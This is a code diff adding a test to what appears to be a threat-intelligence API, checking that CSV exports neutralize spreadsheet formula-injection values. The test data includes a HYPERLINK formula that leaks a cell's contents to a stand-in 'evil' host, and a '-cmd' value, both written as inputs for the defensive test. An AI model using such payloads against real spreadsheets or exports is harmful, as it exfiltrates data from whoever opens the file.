@@ -96,6 +96,24 @@ def test_since_until_bound_the_events(tmp_path, folder):
     assert by_value[SHA256]["first_seen"] == by_value[SHA256]["last_seen"]
 
 
+def test_csv_cells_with_formula_prefixes_are_neutralized(tmp_path, folder):
+    # GitHub Advanced Security (PR #271): a value like =HYPERLINK(...) must not run as a formula in Excel.
+    client = _client(tmp_path, folder)
+    _new_event(client, "ev-evil", "2026-10-15T10:00:00+02:00",
+               [{"type": "user", "value": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")"},
+                {"type": "user", "value": "-cmd"}, {"type": "user", "value": "normal"}])
+    response = client.get(f"/api/v1/topics/{TOPIC}/iocs", params={"format": "csv"})
+    assert response.status_code == 200
+    parsed = list(csv.reader(io.StringIO(response.text)))
+    values = {row[1] for row in parsed[1:]}
+    assert "'=HYPERLINK(\"http://evil/?\"&A2,\"x\")" in values
+    assert "'-cmd" in values
+    assert "normal" in values
+    # the stored value itself is unchanged
+    event = client.get("/api/v1/events/ev-evil").json()
+    assert any(item["value"] == "=HYPERLINK(\"http://evil/?\"&A2,\"x\")" for item in event["entities"])
+
+
 def test_csv_format(tmp_path, folder):
     _seed(tmp_path, folder)
     from chronicle.db import connect
